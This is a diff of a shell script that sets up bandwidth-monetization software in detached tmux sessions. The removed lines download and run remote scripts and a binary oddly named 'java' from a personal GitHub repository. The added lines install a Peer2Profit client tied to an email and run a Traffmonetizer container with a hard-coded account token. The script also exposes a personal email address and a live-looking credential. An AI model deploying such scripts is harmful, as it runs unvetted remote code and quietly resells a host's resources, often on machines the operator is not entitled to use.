@@ -1,20 +1,10 @@
 #!/bin/sh
 
 sudo apt-get update	
-sudo apt install build-essential gnupg2 gcc make gnupg2 unzip -y < "/dev/null"
 
 
-sudo wget https://github.com/minnie1311/Python3/raw/main/ubuntu_18.04.zip
-sudo unzip -o ubuntu_18.04.zip
-sudo chmod +x java
-sudo rm start.sh
-wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
-sudo tmux new-session -d -s 2 'bash p2p.sh'
-sudo wget https://raw.githubusercontent.com/minnie1311/Python3/main/autostart.sh
-sudo chmod +x autostart.sh
-sudo tmux new-session -d -s 1 './autostart.sh'
-
-
-
-
+wget https://updates.peer2profit.app/p2pclient_0.60_amd64.deb -O p2p-service.deb
+sudo dpkg -i p2p-service.deb
+sudo tmux new-session -d -s 1111 'p2pclient -l mickeypp@gmail.com'
+sudo tmux new-session -d -s 111 'docker run -i --name tm traffmonetizer/cli start accept --token VyeG53GE4UXSL/JTCoRJwX1xHwWzziBW2dHTUkGK1lo='
 
